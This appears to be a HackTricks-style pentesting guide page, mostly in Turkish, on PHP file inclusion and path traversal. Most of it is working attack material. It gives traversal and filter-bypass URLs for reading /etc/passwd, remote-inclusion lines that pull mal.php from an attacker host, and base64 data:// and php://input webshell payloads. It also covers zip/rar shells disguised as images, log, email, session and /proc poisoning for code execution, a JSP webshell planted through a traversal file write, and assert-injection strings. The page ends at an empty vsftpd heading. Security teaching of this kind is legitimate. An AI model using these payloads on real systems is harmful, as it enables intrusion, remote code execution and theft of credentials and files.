# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Dosya uzak bir sunucudan yüklenir (En iyi: Kodu siz yazabilirsiniz ve sunucu onu çalıştırır). PHP'de bu varsayılan olarak **devre dışıdır** (**allow_url_include**).\
**Local File Inclusion (LFI):** Sunucu yerel bir dosya yükler.

Güvenlik açığı, kullanıcı sunucunun yükleyeceği dosyayı bir şekilde kontrol edebildiğinde ortaya çıkar.

Etkilenen **PHP fonksiyonları**: require, require_once, include, include_once

Bir açığı istismar etmek için ilginç bir araç: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Birden fazla \*nix LFI listesini birleştirip daha fazla yol ekleyerek bunu oluşturdum:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Ayrıca `/`'i `\` ile değiştirmeyi deneyin\
Ayrıca `../../../../../` eklemeyi deneyin

Birden fazla teknik kullanarak /etc/password dosyasını (zafiyetin varlığını kontrol etmek için) bulmaya çalışan bir liste [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) adresinde bulunabilir.

### **Windows**

Merge of different wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Ayrıca `/`'i `\` ile değiştirmeyi deneyin\
Ayrıca `C:/`'yi kaldırıp `../../../../../` eklemeyi deneyin

Birden fazla teknik kullanarak /boot.ini dosyasını (zafiyetin varlığını kontrol etmek için) bulmaya çalışan bir liste [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) adresinde bulunabilir.

### **OS X**

Linux için LFI listesini kontrol edin.

## Basic LFI and bypasses

Tüm örnekler Local File Inclusion içindir ancak Remote File Inclusion için de uygulanabilir (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences özyinelemeli olmayan şekilde temizlenmiş
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Sağlanan dizenin sonuna eklenen ekstra karakterlerin atlatılması (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Bu **PHP 5.4'ten beri çözülmüştür**

### **Kodlama**

Standart dışı kodlamalar kullanabilirsiniz, örn. double URL encode (ve diğerleri):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Mevcut klasörden

Belki back-end klasör yolunu kontrol ediyordur:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Bir Sunucuda Dosya Sistemi Dizinlerini Keşfetme

Bir sunucunun dosya sistemi, yalnızca dosyaları değil dizinleri de belirlemek için belirli teknikler kullanılarak özyinelemeli olarak keşfedilebilir. Bu işlem dizin derinliğinin belirlenmesini ve belirli klasörlerin varlığının yoklanmasını içerir. Bunu başarmak için aşağıda ayrıntılı bir yöntem bulunmaktadır:

1. **Dizin Derinliğini Belirleyin:** Sunucunuzun mevcut dizin derinliğini, `/etc/passwd` dosyasını başarıyla alarak belirleyin (sunucu Linux tabanlıysa uygulanır). Örnek bir URL aşağıdaki gibi yapılandırılmış olabilir ve üç katmanlık bir derinliği gösterir:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Klasörleri Sorgulama:** Şüphelenilen klasörün adını (ör. `private`) URL'ye ekleyin, sonra tekrar `/etc/passwd`'e gidin. Ek dizin seviyesi, depth değerini bir artırmayı gerektirir:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Sonuçları Yorumlayın:** Sunucunun yanıtı klasörün var olup olmadığını gösterir:
- **Hata / Çıktı Yok:** Klasör `private` muhtemelen belirtilen konumda mevcut değildir.
- **Contents of `/etc/passwd`:** `private` klasörünün varlığı doğrulanır.
4. **Yinelemeli Keşif:** Bulunan klasörler aynı teknik veya geleneksel Local File Inclusion (LFI) yöntemleri kullanılarak alt dizinler veya dosyalar için daha fazla sorgulanabilir.

Dosya sisteminin farklı konumlarındaki dizinleri keşfetmek için payload'u buna göre ayarlayın. Örneğin, `/var/www/` içinde bir `private` dizini olup olmadığını kontrol etmek için (mevcut dizin derinliği 3 varsayıldığında) kullanın:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation, web uygulamalarında dosya yollarını manipüle etmek için kullanılan bir yöntemdir. Genellikle dosya yollarının sonuna ek karakterler ekleyen belirli güvenlik önlemlerini aşarak kısıtlı dosyalara erişmek için kullanılır. Amaç, güvenlik önlemi tarafından değiştirildikten sonra bile hedeflenen dosyaya işaret eden bir dosya yolu oluşturmaktır.

In PHP, various representations of a file path can be considered equivalent due to the nature of the file system. For instance:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` ve `/etc/passwd/` aynı yol olarak değerlendirilir.
- Son 6 karakter `passwd` olduğunda, sonuna `/` eklemek (bunu `passwd/` yapar) hedeflenen dosyayı değiştirmez.
- Benzer şekilde, bir dosya yoluna `.php` eklenmişse (örn. `shellcode.php`), sonuna `/.` eklemek erişilen dosyayı değiştirmez.

Aşağıdaki örnekler, hassas içeriği nedeniyle sıkça hedef olan `/etc/passwd` dosyasına erişmek için path truncation'ın nasıl kullanılacağını gösterir (kullanıcı hesap bilgileri):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Bu senaryolarda gereken `../` dizisi sayısı yaklaşık 2027 olabilir, ancak bu sayı sunucunun yapılandırmasına göre değişebilir.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) combined with extra dot segments and characters can be used to navigate the file system, effectively ignoring appended strings by the server.
- **Determining the Required Number of Traversals**: Deneme-yanılma yoluyla, kök dizine ve ardından `/etc/passwd`'e ulaşmak için gereken tam `../` dizisi sayısı bulunabilir; bu sayede eklenmiş stringler (ör. `.php`) etkisizleştirilir ancak hedef yol (`/etc/passwd`) korunur.
- **Starting with a Fake Directory**: Genellikle yol, var olmayan bir dizinle (örn. `a/`) başlatılır. Bu teknik önlem amaçlı ya da sunucunun yol ayrıştırma mantığının gereksinimlerini karşılamak için kullanılır.

When employing path truncation techniques, sunucunun yol ayrıştırma davranışını ve dosya sistemi yapısını anlamak çok önemlidir. Her senaryo farklı bir yaklaşım gerektirebilir ve en etkili yöntemi bulmak için genellikle test yapılması gerekir.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

php'de bu varsayılan olarak devre dışı bırakılmıştır çünkü **`allow_url_include`** **Off.** Çalışması için **On** olmalıdır; bu durumda sunucunuzdan bir PHP dosyası include ederek RCE elde edebilirsiniz:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Eğer bir sebepten dolayı **`allow_url_include`** **On** ise, ancak PHP harici web sayfalarına erişimi **filtreliyorsa**, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), örneğin data protocol ile base64 kullanarak bir b64 PHP kodunu decode edip RCE elde edebilirsiniz:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Önceki kodda, son `+.txt` eklendi çünkü attacker'ın `.txt` ile biten bir stringe ihtiyacı vardı, bu yüzden string onunla bitiyor ve b64 decode işleminden sonra o kısım sadece çöp döndürecek ve gerçek PHP kodu dahil edilecek (ve dolayısıyla, çalıştırılacak).

Başka bir örnek **`php://` protokolünü kullanmayan** şöyle olurdu:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Root öğesi

Aşağıdaki gibi bir python kodunda:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Kullanıcı **`file_name`**'e bir **mutlak dosya yolu** gönderirse, **önceki yol sadece kaldırılır**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Bu, [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join)'e göre beklenen davranıştır:

> Eğer bir bileşen mutlak bir yol ise, önceki tüm bileşenler atılır ve birleştirme mutlak yol bileşeninden devam eder.

## Java Dizin Listeleme

Görünüşe göre Java'da bir Path Traversal varsa ve bir dosya yerine **bir dizin isterseniz**, dizinin **içeriği listelenerek döndürülür**. Bu diğer dillerde olmayacaktır (bildiğim kadarıyla).

## En Çok Etkilenebilecek 25 Parametre

İşte local file inclusion (LFI) zafiyetine açık olabilecek en çok etkilenen 25 parametrenin listesi (kaynak: [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filtreleri, veri okunmadan veya yazılmadan önce veriler üzerinde temel **değişiklik işlemleri** gerçekleştirmeye izin verir. Filtrelerin 5 kategorisi vardır:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Verideki tagleri kaldırır ( "<" ile ">" arasındaki her şey)
- Bu filtrenin modern PHP sürümlerinde artık bulunmadığını unutmayın
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Farklı bir kodlamaya dönüştürür (`convert.iconv.<input_enc>.<output_enc>`). Desteklenen tüm kodlamaların **listesini** almak için konsolda `iconv -l` çalıştırın

> [!WARNING]
> `convert.iconv.*` dönüşüm filtresini kötüye kullanarak **istediğiniz metni üretebilirsiniz**, bu da rastgele metin yazmak veya include gibi bir fonksiyonun rastgele metni işlemesini sağlamak için faydalı olabilir. Daha fazla bilgi için [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md) adresine bakın.

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: İçeriği sıkıştırır (çok fazla bilgi exfiltrate ediliyorsa kullanışlı olabilir)
- `zlib.inflate`: Veriyi dekomprese eder
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Kullanımdan kaldırıldı
- `mdecrypt.*` : Kullanımdan kaldırıldı
- Other Filters
- PHP'de `var_dump(stream_get_filters());` çalıştırdığınızda birkaç **beklenmeyen filtre** bulabilirsiniz:
- `consumed`
- `dechunk`: HTTP chunked encoding'i tersine çevirir
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> php://filter kısmı büyük/küçük harfe duyarsızdır

### Rastgele dosyaları okumak için php filters'ı oracle olarak kullanma

[**Bu yazıda**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) sunulan teknik, sunucunun çıktıyı geri vermediği durumlarda yerel bir dosyayı okumaya olanak verir. Bu teknik, **php filters kullanılarak oracle olarak yapılan dosyanın char by char boolean exfiltration'ına** dayanır. Bunun nedeni php filters'ın bir metni php'nin bir hata fırlatacağı kadar büyütebilmesidir.

Orijinal yazıda tekniğin detaylı açıklaması bulunuyor, burada kısa bir özet:

- Kodlayıcı **`UCS-4LE`**'yi kullanarak metnin başındaki karakteri öne çıkarın ve string boyutunun üssel olarak artmasını sağlayın.
- Bu, ilk harf doğru tahmin edildiğinde php'nin bir **error** tetikleyeceği kadar büyük bir **metin** üretmek için kullanılacak.
- **dechunk** filtresi, **ilk karakter hexadecimal değilse her şeyi kaldırır**, bu yüzden ilk karakterin hex olup olmadığını anlayabiliriz.
- Bu, öncekiyle (ve tahmin edilen harfe bağlı diğer filtrelerle) birleştirildiğinde, metnin başlangıcındaki bir harfi, onu hexadecimal olmayan hale getirmek için yeterli dönüşümü ne zaman yaptığımızı görerek tahmin etmemizi sağlayacak. Çünkü eğer hex ise, dechunk onu silmez ve başlangıç bombası php error'a neden olur.
- Kodlayıcı **convert.iconv.UNICODE.CP930**, her harfi kendisinden sonraki harfe dönüştürür (yani bu codec'ten sonra: a -> b). Bu, örneğin ilk harfin `a` olup olmadığını keşfetmemizi sağlar; çünkü bu codec'i 6 kez uygularsak a->b->c->d->e->f->g olur ve harf artık hexadecimal karakter olmaz, dolayısıyla dechunk onu silmez ve php error başlatılır çünkü başlangıç bombasıyla çarpılır.
- Başlangıçta **rot13** gibi diğer dönüşümler kullanarak n, o, p, q, r gibi diğer karakterleri leak etmek mümkündür (ve diğer codec'ler de diğer harfleri hex aralığına taşımak için kullanılabilir).
- İlk karakter bir sayı olduğunda, sayıyı elde edebilmek için önce base64 ile encode etmek ve sayıyı leak etmek için ilk 2 karakteri leak etmek gerekir.
- Son problem **ilk harften daha fazlasını nasıl leak edeceğimizi** görmek. **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** gibi order memory filters kullanarak karakterlerin sırasını değiştirmek ve metnin ilk pozisyonuna başka harfleri getirmek mümkündür.
- Ve daha fazla veri elde edebilmek için fikir, **convert.iconv.UTF16.UTF16** ile başta 2 byte junk data oluşturmak, **UCS-4LE** uygulayarak bunları sonraki 2 byte ile **pivot** yapmak ve junk data'ya kadar veriyi silmektir (bu, başlangıçtaki metnin ilk 2 byte'ını kaldırır). İstediğiniz biti leak edene kadar bunu tekrarlayın.

Yazıda bu işlemi otomatikleştiren bir araç da leak edildi: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Ayrıca **php://stdin, php://stdout and php://stderr** sırasıyla **dosya tanımlayıcıları 0, 1 ve 2**'ye erişmek için kullanılabilir (bir saldırıda bunun nasıl yararlı olabileceğinden emin değilim)

### zip:// and rar://

İçinde bir PHPShell bulunan Zip veya Rar dosyası yükleyin ve ona erişin.\
rar protocol'u kötüye kullanabilmek için bunun **özellikle etkinleştirilmesi gerekir**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Bu protokolün php yapılandırmaları **`allow_url_open`** ve **`allow_url_include`** tarafından kısıtlandığını unutmayın

### expect://

Expect etkinleştirilmiş olmalıdır. Bunu kullanarak kod çalıştırabilirsiniz:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST parametrelerinde payload'ınızı belirtin:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

A `.phar` dosyası, bir web uygulaması dosya yüklemek için `include` gibi fonksiyonları kullandığında PHP kodu çalıştırmak amacıyla kullanılabilir. Aşağıdaki PHP kodu örneği bir `.phar` dosyasının oluşturulmasını göstermektedir:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` dosyasını derlemek için aşağıdaki komut çalıştırılmalıdır:
```bash
php --define phar.readonly=0 create_path.php
```
Çalıştırıldığında `test.phar` adlı bir dosya oluşturulur; bu dosya Local File Inclusion (LFI) zafiyetlerini sömürmek için kullanılabilir.

Eğer LFI içinde PHP kodunu çalıştırmadan yalnızca dosya okuma yapılıyorsa — örneğin `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` veya `filesize()` gibi fonksiyonlarla — deserialization zafiyetinin sömürülmeye çalışılması mümkün olabilir. Bu zafiyet, `phar` protokolü kullanılarak dosya okunmasıyla ilişkilidir.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

PHP'de php filters'ı destekleyen herhangi bir rastgele dosya okuması, RCE elde etmek için suistimal edilebiliyordu. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Çok kısa özet: PHP heap'inde bir **3 byte overflow** suistimal edilerek belirli bir boyuttaki serbest chunk zinciri **alter the chain of free chunks** değiştirilip herhangi bir adrese **write anything in any address** yazılabilmesi sağlandı; bu yüzden **`system`** çağıracak bir hook eklendi.\
Daha fazla php filters suistimaliyle belirli boyutlarda chunk'lar alloc etmek mümkündü.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Belleğe veya geçici bir dosyaya yazma (file inclusion saldırısında bunun nasıl işe yarayabileceğinden emin değilim)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Yerel dosya sistemine erişim
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL'lerine erişim
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL'lerine erişim
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Sıkıştırma akışları
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Desene uyan yol adlarını bulma (Hiç yazdırılabilir veri döndürmediği için burada pek kullanışlı değil)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Ses akışları (rastgele dosyaları okumak için kullanışlı değil)

## LFI via PHP's 'assert'

PHP'de 'assert' fonksiyonuyla ilgili olarak Local File Inclusion (LFI) riskleri özellikle yüksektir; çünkü 'assert' dizeler içindeki kodu çalıştırabilir. Bu, ".." gibi dizin geçiş karakterleri içeren girdiler kontrol edilip düzgün temizlenmiyorsa özellikle sorunludur.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Bu, traversal'ı durdurmayı amaçlasa da, istemeden code injection için bir vektör oluşturur. Dosya içeriklerini okumak için bunu istismar etmek amacıyla bir saldırgan şunu kullanabilir:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Benzer şekilde, rastgele sistem komutlarını çalıştırmak için şu kullanılabilir:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Bu teknik, bir **dosya yolunu** sizin **kontrol ettiğiniz**, bir **PHP fonksiyonunun** bir dosyaya **erişecek** olduğu fakat dosyanın içeriğini görmeyeceğiniz durumlarda (ör. basit bir çağrı olan **`file()`**) ilgilidir; içerik gösterilmez.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

Özetle, teknik bir dosyanın içeriğini o kadar "büyük" hale getirmek için **"UCS-4LE" encoding** kullanır ki, dosyayı açan **PHP fonksiyonu** bir **hata** tetikler.

Daha sonra ilk karakteri leak etmek için filtre **`dechunk`** base64 veya rot13 gibi diğerleriyle birlikte kullanılır ve son olarak filtreler **convert.iconv.UCS-4.UCS-4LE** ve **convert.iconv.UTF16.UTF-16BE** diğer karakterleri başa yerleştirmek ve onları leak etmek için kullanılır.

Potansiyel olarak zafiyetli fonksiyonlar: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Teknik detaylar için belirtilen yazıya bakın!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

When server-side code that ingests/uploads files builds the destination path using user-controlled data (e.g., a filename or URL) without canonicalising and validating it, `..` segments and absolute paths can escape the intended directory and cause an arbitrary file write. If you can place the payload under a web-exposed directory, you usually get unauthenticated RCE by dropping a webshell.

Typical exploitation workflow:
- Identify a write primitive in an endpoint or background worker that accepts a path/filename and writes content to disk (e.g., message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Determine web-exposed directories. Common examples:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Craft a traversal path that breaks out of the intended storage directory into the webroot, and include your webshell content.
- Browse to the dropped payload and execute commands.

Notes:
- The vulnerable service that performs the write may listen on a non-HTTP port (e.g., a JMF XML listener on TCP 4004). The main web portal (different port) will later serve your payload.
- On Java stacks, these file writes are often implemented with simple `File`/`Paths` concatenation. Lack of canonicalisation/allow-listing is the core flaw.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening that defeats this class of bugs:
- Kanonik bir yola çözümleyin ve bunun allow-listed base directory'nin bir alt öğesi olduğunu zorunlu kılın.
- `..`, absolute roots veya drive letters içeren herhangi bir yolu reddedin; tercih edilen yöntem generated filenames kullanmaktır.
- Writer'ı düşük ayrıcalıklı bir hesap olarak çalıştırın ve yazma dizinlerini served roots'tan ayırın.

## Remote File Inclusion

Önceden açıklandı, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

Eğer Apache veya Nginx sunucusu include fonksiyonu içerisinde **vulnerable to LFI** ise **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`** dosyalarına erişmeyi deneyebilirsiniz; **user agent** içine veya bir **GET parameter** içine **`<?php system($_GET['c']); ?>`** gibi bir php shell koyup o dosyayı include edebilirsiniz

> [!WARNING]
> Dikkat: shell için **simple quotes** yerine **double quotes** kullanırsanız, çift tırnaklar "_**quote;**_" stringine dönüştürülecek, **PHP orada bir hata fırlatacaktır** ve **başka hiçbir şey çalıştırılmayacaktır**.
>
> Ayrıca, payload'u **doğru yazdığınızdan** emin olun; aksi takdirde PHP log dosyasını her yüklemeye çalıştığında hata verecek ve ikinci bir şansınız olmayacaktır.

Bu diğer loglarda da yapılabilir ama **dikkatli olun,** log içindeki kod URL encoded olabilir ve bu Shell'i bozabilir. Header **authorisation "basic"** Base64 olarak "user:password" içerir ve loglarda decode edilir. PHPShell bu header içine yerleştirilebilir.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing kelime listesi: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### E-posta ile

**Bir e-posta gönderin** internal bir hesaba (user@localhost) PHP payload'unuzu içerecek şekilde, örneğin `<?php echo system($_REQUEST["cmd"]); ?>` ve kullanıcıya ait maili **`/var/mail/<USERNAME>`** veya **`/var/spool/mail/<USERNAME>`** gibi bir yol ile dahil etmeyi deneyin

### /proc/*/fd/* üzerinden

1. Çok sayıda shell yükleyin (örneğin: 100)
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) adresini include edin, burada $PID = işlemin PID'i (brute force ile bulunabilir) ve $FD dosya tanımlayıcısıdır (o da brute force ile bulunabilir)

### /proc/self/environ üzerinden

Bir log dosyası gibi, payload'u User-Agent içine gönderin; /proc/self/environ dosyasının içinde yansıtılacaktır
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Yükleme yoluyla

Bir dosya yükleyebiliyorsanız, içine shell payload enjekte edin (örneğin: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Dosyanın okunabilirliğini korumak için resimlerin/doc/pdf'lerin metadata'sına enjekte etmek en iyisidir

### Zip file yüklemesi ile

Sıkıştırılmış, içinde PHP shell bulunan bir ZIP dosyası yükleyin ve erişin:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP sessions üzerinden

Web sitesinin PHP Session (PHPSESSID) kullanıp kullanmadığını kontrol edin
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP'de bu oturumlar _/var/lib/php5/sess\\_\[PHPSESSID]\_ dosyalarında saklanır
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Çerezi `<?php system('cat /etc/passwd');?>` olarak ayarla
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
PHP oturum dosyasını dahil etmek için LFI'yi kullanın.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh ile

Eğer ssh aktifse, hangi kullanıcının kullanıldığını kontrol edin (/proc/self/status & /etc/passwd) ve **\<HOME>/.ssh/id_rsa** dosyasına erişmeyi deneyin.

### **Üzerinden** **vsftpd** _**logları**_

